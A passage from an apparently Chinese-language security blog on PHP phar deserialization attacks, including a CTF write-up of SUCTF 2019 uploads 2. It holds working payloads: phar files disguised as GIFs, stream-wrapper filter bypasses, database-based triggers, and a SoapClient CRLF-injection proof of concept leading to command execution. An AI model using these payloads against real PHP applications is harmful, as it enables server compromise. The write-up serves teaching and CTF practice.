<code>manifest</code> / 文件内容 / 签名。 stub 需要 <code>__HALT_COMPILER();</code> 这个调用在PHP代码中。</p><p>manifest 包含压缩文件的权限、属性、序列化形式存储的meta-data等信息，这是攻击的核心部分，主要就是解析Phar时对meta-data的反序列化。</p><p>phar的实现在 <code>php-src/ext/phar/phar.c</code> 中，主要是 <code>phar_parse_metadata</code> 函数在解析phar文件时调用了 <code>php_var_unserialize</code> ，因而造成问题。</p><p>而php在文件流处理过程中会调用 <code>_php_stream_stat_path</code> (/main/streams/streams.c) ，而后间接调用 <code>phar_wrapper_stat</code> ，所以大量的文件操作函数都可以触发phar的反序列问题。</p><p>目前已知部分的触发函数有:</p><div class="hljs code-wrapper"><pre><code class="hljs gradle">fileatime <span class="hljs-regexp">/ filectime /</span> filemtime <span class="hljs-regexp">/stat /</span> fileinode <span class="hljs-regexp">/ fileowner /</span> filegroup <span class="hljs-regexp">/ fileperms /</span> <span class="hljs-keyword">file</span> <span class="hljs-regexp">/ file_get_contents /</span> readfile <span class="hljs-regexp">/ fopen /</span> file_exists <span class="hljs-regexp">/ is_dir /</span> is_executable <span class="hljs-regexp">/ is_file /</span> is_link <span class="hljs-regexp">/ is_readable /</span> is_writeable <span class="hljs-regexp">/ is_writable /</span> parse_ini_file <span class="hljs-regexp">/ unlink /</span> <span class="hljs-keyword">copy</span> <span class="hljs-regexp">/ exif_thumbnail /</span> exif_imagetype <span class="hljs-regexp">/ imageloadfont /</span> imagecreatefrom <span class="hljs-regexp">/ hash_hmac_file /</span> hash_file <span class="hljs-regexp">/ hash_update_file /</span> md5_file <span class="hljs-regexp">/ sha1_file /</span> get_meta_tags <span class="hljs-regexp">/ get_headers /</span> getimagesize <span class="hljs-regexp">/ getimagesizefromstring /</span>ZipArchive-&gt;extractTo /finfo_file</code></pre></div><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20200226153548.png" alt="img"></p><h4 id="生成phar"><a href="#生成phar" class="headerlink" title="生成phar"></a>生成phar</h4><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestObject</span> </span>&#123;    &#125;    <span class="hljs-comment">// 生成phar 文件的格式</span>    @unlink(<span class="hljs-string">&quot;phar.phar&quot;</span>);    <span class="hljs-variable">$o</span> = <span class="hljs-keyword">new</span> TestObject();    <span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> Phar(<span class="hljs-string">&quot;phar.phar&quot;</span>); <span class="hljs-comment">//后缀名必须为phar</span>    <span class="hljs-variable">$phar</span>-&gt;startBuffering();    <span class="hljs-variable">$phar</span>-&gt;setStub(<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="hljs-comment">//设置stub</span>    <span class="hljs-variable">$phar</span>-&gt;setMetadata(<span class="hljs-variable">$o</span>); <span class="hljs-comment">//将自定义的meta-data存入manifest</span>    <span class="hljs-variable">$phar</span>-&gt;addFromString(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>); <span class="hljs-comment">//添加要压缩的文件</span>    <span class="hljs-comment">//签名自动计算</span>    <span class="hljs-variable">$phar</span>-&gt;stopBuffering();<span class="hljs-meta">?&gt;</span></code></pre></div><p>注意：</p><ul><li><p>要将php.ini中的**<code>phar.readonly</code>选项设置为Off**，否则无法生成phar文件。</p></li><li><p>生成时必须设置为phar后缀，生成后可以改后缀进行上传。</p></li></ul><h4 id="伪造phar-文件为其他格式"><a href="#伪造phar-文件为其他格式" class="headerlink" title="伪造phar 文件为其他格式"></a>伪造phar 文件为其他格式</h4><p>只需要改 文件头 stub即可,php识别phar文件是通过其文件头的stub，更确切一点来说是<code>__HALT_COMPILER();?&gt;</code>这段代码，对前面的内容或者后缀名是没有要求的。那么我们就可以通过添加任意的文件头+修改后缀名的方式将phar文件伪装成其他格式的文件</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$phar</span>-&gt;setStub(<span class="hljs-string">&quot;GIF89a&quot;</span> . <span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</code></pre></div><p>例如SUCTF2019 uploads 2 中<code>$phar-&gt;setStub(&quot;GIF89a&lt; ?php __HALT_COMPILER(); ?&gt;&quot;);</code>  </p><p>&lt;和？中间加了一个空格绕过了Check类的check检查，这个修改对phar文件没有影响</p><h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><ul><li>phar 文件能够上传</li><li>文件操作函数参数可控, <code>:</code> ,<code>/</code> <code>phar</code> 等特殊字符没有被过滤</li><li>有可用的魔术方法作为”跳板”</li></ul><h4 id="bypass-phar-不能出现在首部"><a href="#bypass-phar-不能出现在首部" class="headerlink" title="bypass phar:// 不能出现在首部"></a>bypass phar:// 不能出现在首部</h4><p>这时候我们可以利用<code>compress.zlib://</code> 或<code>compress.bzip2://</code>函数,<code>compress.zlib://</code>和<code>compress.bzip2://</code>同样适用于<code>phar://</code>。</p><p>payload: <code>compress.zlib://phar://phar.phar/test.txt</code></p><p><strong>ctf题中出现的一些过滤：</strong></p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/^(ftp|zlib|data|glob|phar|ssh2|compress.bzip2|compress.zlib|rar|ogg|expect)(.|\\s)*|(.|\\s)*(file|data|\.\.)(.|\\s)*/i&#x27;</span>,<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>]))&#123;        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Go away!&quot;</span>);    &#125;</code></pre></div><p>这里过滤了phar协议，但是可以使用php://filter协议进行绕过</p><p><code>php://filter/resource=phar://upload/46c01c941bd10a9c3038752f7354f2e8/b1b288ddc6069e3befa40731e382b192.jpeg</code></p><p>也可以使用zip或者bzip2协议绕过</p><div class="hljs code-wrapper"><pre><code class="hljs javascript">demo.php?filename=compress.bzip2:<span class="hljs-comment">//phar://upload_file/shell.gif/a</span></code></pre></div><h4 id="Postgresql"><a href="#Postgresql" class="headerlink" title="Postgresql"></a>Postgresql</h4><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-variable">$pdo</span> = <span class="hljs-keyword">new</span> PDO(sprintf(<span class="hljs-string">&quot;pgsql:host=%s;dbname=%s;user=%s;password=%s&quot;</span>, <span class="hljs-string">&quot;127.0.0.1&quot;</span>, <span class="hljs-string">&quot;postgres&quot;</span>, <span class="hljs-string">&quot;sx&quot;</span>, <span class="hljs-string">&quot;123456&quot;</span>));<span class="hljs-variable">$pdo</span>-&gt;pgsqlCopyFromFile(<span class="hljs-string">&#x27;aa&#x27;</span>, <span class="hljs-string">&#x27;phar://test.phar/aa&#x27;</span>);</code></pre></div><p>pgsqlCopyToFile和pg_trace同样也是能使用的，只是它们需要开启phar的写功能</p><h4 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h4><p>LOAD DATA LOCAL INFILE也会触发这个php_stream_open_wrapper.</p><p>但是需要修改mysqld配置,因为不是默认配置</p><div class="hljs code-wrapper"><pre><code class="hljs ini"><span class="hljs-section">[mysqld]</span><span class="hljs-attr">local-infile</span>=<span class="hljs-number">1</span><span class="hljs-attr">secure_file_priv</span>=<span class="hljs-string">&quot;&quot;</span></code></pre></div><p>例如如下代码：</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> </span>&#123;     <span class="hljs-keyword">public</span> <span class="hljs-variable">$s</span> = <span class="hljs-string">&#x27;&#x27;</span>;     <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span> (<span class="hljs-params"></span>) </span>&#123;        system(<span class="hljs-keyword">$this</span>-&gt;s);    &#125;   &#125;<span class="hljs-variable">$m</span> = mysqli_init();mysqli_options(<span class="hljs-variable">$m</span>, MYSQLI_OPT_LOCAL_INFILE, <span class="hljs-literal">true</span>);<span class="hljs-variable">$s</span> = mysqli_real_connect(<span class="hljs-variable">$m</span>, <span class="hljs-string">&#x27;localhost&#x27;</span>, <span class="hljs-string">&#x27;root&#x27;</span>, <span class="hljs-string">&#x27;root&#x27;</span>, <span class="hljs-string">&#x27;mesboard&#x27;</span>, <span class="hljs-number">3306</span>);<span class="hljs-variable">$p</span> = mysqli_query(<span class="hljs-variable">$m</span>, <span class="hljs-string">&#x27;LOAD DATA LOCAL INFILE \&#x27;phar://test.phar/aaa\&#x27; INTO TABLE users  LINES TERMINATED BY \&#x27;\r\n\&#x27;  IGNORE 1 LINES;&#x27;</span>);</code></pre></div><p><code>makphar.php</code>:</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;        <span class="hljs-keyword">public</span> <span class="hljs-variable">$s</span>=<span class="hljs-string">&#x27;ls&#x27;</span>;&#125;@unlink(<span class="hljs-string">&#x27;test.phar&#x27;</span>);<span class="hljs-variable">$phar</span>=<span class="hljs-keyword">new</span> Phar(<span class="hljs-string">&#x27;test.phar&#x27;</span>);<span class="hljs-variable">$phar</span>-&gt;startBuffering();<span class="hljs-variable">$phar</span>-&gt;addFromString(<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>);<span class="hljs-variable">$phar</span>-&gt;setStub(<span class="hljs-string">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);<span class="hljs-variable">$o</span>=<span class="hljs-keyword">new</span> A();<span class="hljs-variable">$phar</span>-&gt;setMetaData(<span class="hljs-variable">$o</span>);<span class="hljs-variable">$phar</span>-&gt;stopBuffering();<span class="hljs-meta">?&gt;</span></code></pre></div><p><code>php5.6</code>下：</p><p><a href="https://www.github.com/coomrade/Img/raw/master/pics/1540438957427.png"><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1540438957427.png" alt="enter description here"></a></p><p>php7.0`:</p><p><a href="https://www.github.com/coomrade/Img/raw/master/pics/1540439032065.png"><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1540439032065.png" alt="enter description here"></a></p><p>只需要目标表是存在的就可以了，并没有其他要求，唯一可惜的就是不是默认配置</p><h3 id="例题：SUCTF-2019-uploads-2"><a href="#例题：SUCTF-2019-uploads-2" class="headerlink" title="例题：SUCTF 2019 uploads 2"></a>例题：SUCTF 2019 uploads 2</h3><p>题目源码：</p><p>class.php</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;config.php&#x27;</span>;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Ad</span></span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span>;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$clazz</span>;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func1</span>;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func2</span>;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func3</span>;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$instance</span>;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$arg1</span>;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$arg2</span>;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$arg3</span>;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$cmd</span>, <span class="hljs-variable">$clazz</span>, <span class="hljs-variable">$func1</span>, <span class="hljs-variable">$func2</span>, <span class="hljs-variable">$func3</span>, <span class="hljs-variable">$arg1</span>, <span class="hljs-variable">$arg2</span>, <span class="hljs-variable">$arg3</span></span>)</span>&#123;        <span class="hljs-keyword">$this</span>-&gt;cmd = <span class="hljs-variable">$cmd</span>;        <span class="hljs-keyword">$this</span>-&gt;clazz = <span class="hljs-variable">$clazz</span>;        <span class="hljs-keyword">$this</span>-&gt;func1 = <span class="hljs-variable">$func1</span>;        <span class="hljs-keyword">$this</span>-&gt;func2 = <span class="hljs-variable">$func2</span>;        <span class="hljs-keyword">$this</span>-&gt;func3 = <span class="hljs-variable">$func3</span>;        <span class="hljs-keyword">$this</span>-&gt;arg1 = <span class="hljs-variable">$arg1</span>;        <span class="hljs-keyword">$this</span>-&gt;arg2 = <span class="hljs-variable">$arg2</span>;        <span class="hljs-keyword">$this</span>-&gt;arg3 = <span class="hljs-variable">$arg3</span>;    &#125;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-variable">$reflect</span> = <span class="hljs-keyword">new</span> ReflectionClass(<span class="hljs-keyword">$this</span>-&gt;clazz);        <span class="hljs-keyword">$this</span>-&gt;instance = <span class="hljs-variable">$reflect</span>-&gt;newInstanceArgs();        <span class="hljs-variable">$reflectionMethod</span> = <span class="hljs-keyword">new</span> ReflectionMethod(<span class="hljs-keyword">$this</span>-&gt;clazz, <span class="hljs-keyword">$this</span>-&gt;func1);        <span class="hljs-variable">$reflectionMethod</span>-&gt;invoke(<span class="hljs-keyword">$this</span>-&gt;instance, <span class="hljs-keyword">$this</span>-&gt;arg1);        <span class="hljs-variable">$reflectionMethod</span> = <span class="hljs-keyword">new</span> ReflectionMethod(<span class="hljs-keyword">$this</span>-&gt;clazz, <span class="hljs-keyword">$this</span>-&gt;func2);        <span class="hljs-variable">$reflectionMethod</span>-&gt;invoke(<span class="hljs-keyword">$this</span>-&gt;instance, <span class="hljs-keyword">$this</span>-&gt;arg2);        <span class="hljs-variable">$reflectionMethod</span> = <span class="hljs-keyword">new</span> ReflectionMethod(<span class="hljs-keyword">$this</span>-&gt;clazz, <span class="hljs-keyword">$this</span>-&gt;func3);        <span class="hljs-variable">$reflectionMethod</span>-&gt;invoke(<span class="hljs-keyword">$this</span>-&gt;instance, <span class="hljs-keyword">$this</span>-&gt;arg3);    &#125;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;        system(<span class="hljs-keyword">$this</span>-&gt;cmd);    &#125;&#125;<span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>] == <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>)&#123;    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;admin&#x27;</span>]))&#123;        <span class="hljs-variable">$cmd</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];        <span class="hljs-variable">$clazz</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;clazz&#x27;</span>];        <span class="hljs-variable">$func1</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;func1&#x27;</span>];        <span class="hljs-variable">$func2</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;func2&#x27;</span>];        <span class="hljs-variable">$func3</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;func3&#x27;</span>];        <span class="hljs-variable">$arg1</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;arg1&#x27;</span>];        <span class="hljs-variable">$arg2</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;arg2&#x27;</span>];        <span class="hljs-variable">$arg2</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;arg3&#x27;</span>];        <span class="hljs-variable">$admin</span> = <span class="hljs-keyword">new</span> Ad(<span class="hljs-variable">$cmd</span>, <span class="hljs-variable">$clazz</span>, <span class="hljs-variable">$func1</span>, <span class="hljs-variable">$func2</span>, <span class="hljs-variable">$func3</span>, <span class="hljs-variable">$arg1</span>, <span class="hljs-variable">$arg2</span>, <span class="hljs-variable">$arg3</span>);        <span class="hljs-variable">$admin</span>-&gt;check();    &#125;&#125;<span class="hljs-keyword">else</span> &#123;    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You r not admin!&quot;</span>;&#125;</code></pre></div><p>可以直接看到命令执行的地方，需要绕过</p><p>$_SERVER[‘REMOTE_ADDR’] == ‘127.0.0.1’</p><p>这个地方基本上就是SSRF了</p><p>func.php</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;class.php&#x27;</span>;<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;submit&quot;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;url&quot;</span>])) &#123;    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/^(ftp|zlib|data|glob|phar|ssh2|compress.bzip2|compress.zlib|rar|ogg|expect)(.|\\s)*|(.|\\s)*(file|data|\.\.)(.|\\s)*/i&#x27;</span>,<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>]))&#123;        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Go away!&quot;</span>);    &#125;<span class="hljs-keyword">else</span>&#123;        <span class="hljs-variable">$file_path</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];        <span class="hljs-variable">$file</span> = <span class="hljs-keyword">new</span> File(<span class="hljs-variable">$file_path</span>);        <span class="hljs-variable">$file</span>-&gt;getMIME();        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;Your file type is &#x27;<span class="hljs-subst">$file</span>&#x27; &lt;/p&gt;&quot;</span>;    &#125;&#125;<span class="hljs-meta">?&gt;</span></code></pre></div><p>这里过滤了phar协议，但是可以使用php://filter协议进行绕过，跟进后又看到有很多的魔法函数，可以猜测考点在phar协议的利用</p><p>跟进看一看类File</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">File</span></span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file_name</span>;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$type</span>;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span> = <span class="hljs-string">&quot;Check&quot;</span>;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file_name</span></span>)</span>&#123;        <span class="hljs-keyword">$this</span>-&gt;file_name = <span class="hljs-variable">$file_name</span>;    &#125;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-variable">$class</span> = <span class="hljs-keyword">new</span> ReflectionClass(<span class="hljs-keyword">$this</span>-&gt;func);        <span class="hljs-variable">$a</span> = <span class="hljs-variable">$class</span>-&gt;newInstanceArgs(<span class="hljs-keyword">$this</span>-&gt;file_name);        <span class="hljs-variable">$a</span>-&gt;check();    &#125;        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getMIME</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-variable">$finfo</span> = finfo_open(FILEINFO_MIME_TYPE);        <span class="hljs-keyword">$this</span>-&gt;type = finfo_file(<span class="hljs-variable">$finfo</span>, <span class="hljs-keyword">$this</span>-&gt;file_name);        finfo_close(<span class="hljs-variable">$finfo</span>);    &#125;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;type;    &#125;&#125;</code></pre></div><p>由于phar协议涉及到文件操作，这里的getMIME正好进行finfo_file文件操作，这个函数很有可能能够进行利用。</p><p>考虑phar协议的利用：</p><ol><li>构造出phar文件</li><li>上传phar文件</li></ol><p>看看有没有上传点，index.php就是</p><p>index.php</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;class.php&#x27;</span>;<span class="hljs-variable">$userdir</span> = <span class="hljs-string">&quot;upload/&quot;</span> . md5(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>]);<span class="hljs-keyword">if</span> (!file_exists(<span class="hljs-variable">$userdir</span>)) &#123;    mkdir(<span class="hljs-variable">$userdir</span>, <span class="hljs-number">0777</span>, <span class="hljs-literal">true</span>);&#125;<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;upload&quot;</span>])) &#123;    <span class="hljs-comment">// 允许上传的图片后缀</span>    <span class="hljs-variable">$allowedExts</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;gif&quot;</span>, <span class="hljs-string">&quot;jpeg&quot;</span>, <span class="hljs-string">&quot;jpg&quot;</span>, <span class="hljs-string">&quot;png&quot;</span>);    <span class="hljs-variable">$tmp_name</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>];    <span class="hljs-variable">$file_name</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>];    <span class="hljs-variable">$temp</span> = explode(<span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-variable">$file_name</span>);    <span class="hljs-variable">$extension</span> = end(<span class="hljs-variable">$temp</span>);    <span class="hljs-keyword">if</span> (((<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;type&quot;</span>] == <span class="hljs-string">&quot;image/gif&quot;</span>)            || (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;type&quot;</span>] == <span class="hljs-string">&quot;image/jpeg&quot;</span>)            || (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;type&quot;</span>] == <span class="hljs-string">&quot;image/png&quot;</span>))        &amp;&amp; (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;size&quot;</span>] &lt; <span class="hljs-number">204800</span>)   <span class="hljs-comment">// 小于 200 kb</span>        &amp;&amp; in_array(<span class="hljs-variable">$extension</span>, <span class="hljs-variable">$allowedExts</span>)    ) &#123;        <span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> Check(<span class="hljs-variable">$tmp_name</span>);        <span class="hljs-variable">$c</span>-&gt;check();        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;error&quot;</span>] &gt; <span class="hljs-number">0</span>) &#123;            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;错误：: &quot;</span> . <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;error&quot;</span>] . <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;            <span class="hljs-keyword">die</span>();        &#125; <span class="hljs-keyword">else</span> &#123;            move_uploaded_file(<span class="hljs-variable">$tmp_name</span>, <span class="hljs-variable">$userdir</span> . <span class="hljs-string">&quot;/&quot;</span> . md5(<span class="hljs-variable">$file_name</span>) . <span class="hljs-string">&quot;.&quot;</span> . <span class="hljs-variable">$extension</span>);            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;文件存储在: &quot;</span> . <span class="hljs-variable">$userdir</span> . <span class="hljs-string">&quot;/&quot;</span> . md5(<span class="hljs-variable">$file_name</span>) . <span class="hljs-string">&quot;.&quot;</span> . <span class="hljs-variable">$extension</span>;        &#125;    &#125; <span class="hljs-keyword">else</span> &#123;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;非法的文件格式&quot;</span>;    &#125;    &#125;</code></pre></div><p>上传的文件需要经过校验：</p><ol><li><p><code>$_FILES[&quot;file&quot;][&quot;type&quot;]</code>文件类型校验</p></li><li><p><code>in_array($extension, $allowedExts)</code>白名单校验</p></li><li><p>Check类的check函数</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Check</span></span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file_name</span>;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file_name</span></span>)</span>&#123;        <span class="hljs-keyword">$this</span>-&gt;file_name = <span class="hljs-variable">$file_name</span>;    &#125;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-variable">$data</span> = file_get_contents(<span class="hljs-keyword">$this</span>-&gt;file_name);        <span class="hljs-keyword">if</span> (mb_strpos(<span class="hljs-variable">$data</span>, <span class="hljs-string">&quot;&lt;?&quot;</span>) !== <span class="hljs-literal">FALSE</span>) &#123;            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;&amp;lt;? in contents!&quot;</span>);        &#125;    &#125;&#125;</code></pre></div><p>文件内容中不能出现<code>&lt;?</code></p></li></ol><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><ol><li>访问index上传phar文件，需要改一个后缀</li><li>访问func利用phar协议触发反序列化</li><li>利用反序列化调用wakeup函数发送soap访问admin.php，执行系统命令。</li><li></li></ol><h4 id="准备phar文件"><a href="#准备phar文件" class="headerlink" title="准备phar文件"></a>准备phar文件</h4><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">File</span></span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file_name</span>;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$type</span>;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span> = <span class="hljs-string">&quot;SoapClient&quot;</span>;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-keyword">$this</span>-&gt;file_name = <span class="hljs-keyword">array</span>(<span class="hljs-literal">null</span>, <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;location&#x27;</span> =&gt; <span class="hljs-string">&quot;http://127.0.0.1/admin.php&quot;</span>, <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; <span class="hljs-string">&quot;c&quot;</span>, <span class="hljs-string">&#x27;user_agent&#x27;</span> =&gt; <span class="hljs-string">&quot;catcat\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 133\r\n\r\ncmd=ls&amp;admin=1&amp;clazz=ArrayIterator&amp;func1=append&amp;func2=append&amp;func3=append&amp;arg1=1&amp;arg2=1&amp;arg3=1\r\n\r\n\r\n&quot;</span>));    &#125;&#125;<span class="hljs-variable">$o</span> = <span class="hljs-keyword">new</span> File();<span class="hljs-variable">$phar</span>=<span class="hljs-keyword">new</span> Phar(<span class="hljs-string">&#x27;poc.phar&#x27;</span>);<span class="hljs-variable">$phar</span>-&gt;startBuffering();<span class="hljs-variable">$phar</span>-&gt;setStub(<span class="hljs-string">&quot;GIF89a&lt; ?php __HALT_COMPILER(); ?&gt;&quot;</span>);<span class="hljs-variable">$phar</span>-&gt;setMetadata(<span class="hljs-variable">$o</span>);<span class="hljs-variable">$phar</span>-&gt;addFromString(<span class="hljs-string">&quot;foo.txt&quot;</span>,<span class="hljs-string">&quot;bar&quot;</span>);<span class="hljs-variable">$phar</span>-&gt;stopBuffering();</code></pre></div><p>注意这里 对phar文件的Stub头的构造，&lt;和？中间加了一个空格绕过了Check类的check检查，这个修改对phar文件没有影响</p><p>phar文件识别的标志为<code>__HALT_COMPILER();?&gt;</code> 前面可以任意修改，这就可以绕过很多限制。</p><h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><p><code>php://filter/resource=phar://upload/46c01c941bd10a9c3038752f7354f2e8/b1b288ddc6069e3befa40731e382b192.jpeg</code></p><h2 id="0x08-php-GMP反序列化类型混淆漏洞"><a href="#0x08-php-GMP反序列化类型混淆漏洞" class="headerlink" title="0x08 php GMP反序列化类型混淆漏洞"></a>0x08 php GMP反序列化类型混淆漏洞</h2><p>首先我们来看一段测试代码</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">obj</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">var</span> <span class="hljs-variable">$ryat</span>;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;ryat = <span class="hljs-number">1</span>;    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">b</span></span>&#123;    <span class="hljs-keyword">var</span> <span class="hljs-variable">$ryat</span> =<span class="hljs-number">1</span>;&#125;<span class="hljs-variable">$obj</span> = <span 